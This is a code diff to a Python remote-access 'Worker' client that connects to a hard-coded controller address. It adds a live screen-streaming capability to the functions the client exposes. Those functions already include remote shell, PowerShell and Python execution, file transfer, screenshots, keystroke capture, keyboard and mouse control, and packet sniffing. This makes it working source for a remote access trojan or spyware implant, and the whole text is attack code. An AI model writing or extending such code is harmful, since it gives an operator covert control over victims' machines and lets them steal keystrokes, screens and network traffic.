@@ -10,6 +10,9 @@ from pynput.mouse import Button,Controller
 from scapy.all import sniff
 from scapy.utils import wrpcap
 import sys
+import mss
+import numpy as np
+import cv2
 
 def cmd(command:str) ->bytes:
     return os.popen(command).read().encode()
@@ -88,6 +91,15 @@ def sniff_from_worker(parameters:str) -> bytes:
         pcap_bytes = file.read()
     return pcap_bytes
 
+def live_stream(doesnt_matter:str) -> bytes:
+    with mss.mss() as sct:
+        monitor = sct.monitors[1]
+        frame = np.array(sct.grab(monitor))
+        frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
+        encoded, buffer = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
+        return buffer.tobytes()
+
+
 class Worker:
     def __init__(self, ip:str, port:int, functions: dict[str,Callable[[str],bytes]] ):
         self.address = (ip,port)
@@ -123,6 +135,7 @@ class Worker:
         while size>0:
             message+=self.client.recv(4096)
             size-=4096
+            time.sleep(0.01)
         return message.decode()
 
     def run(self):
@@ -143,9 +156,9 @@ class Worker:
 
 
 def main():
-    ip = sys.argv[1]
-    port = sys.argv[2]
-    functions:dict[str,Callable[[str],bytes]] = {"cmd":cmd,"powershell":powershell,"python":python, "send_file":send_file,"receive_file":receive_file, "screen_shot":screen_shot, "listen_to_keys":listen_to_keys, "press_key_in_worker":press_key_in_worker, "control_mouse":control_mouse,"sniff_from_worker":sniff_from_worker}
+    ip = "10.0.0.3"
+    port = 5555
+    functions:dict[str,Callable[[str],bytes]] = {"cmd":cmd,"powershell":powershell,"python":python, "send_file":send_file,"receive_file":receive_file, "screen_shot":screen_shot, "listen_to_keys":listen_to_keys, "press_key_in_worker":press_key_in_worker, "control_mouse":control_mouse,"sniff_from_worker":sniff_from_worker, "live_stream":live_stream}
     worker = Worker(ip, int(port), functions)
     worker.run()
 
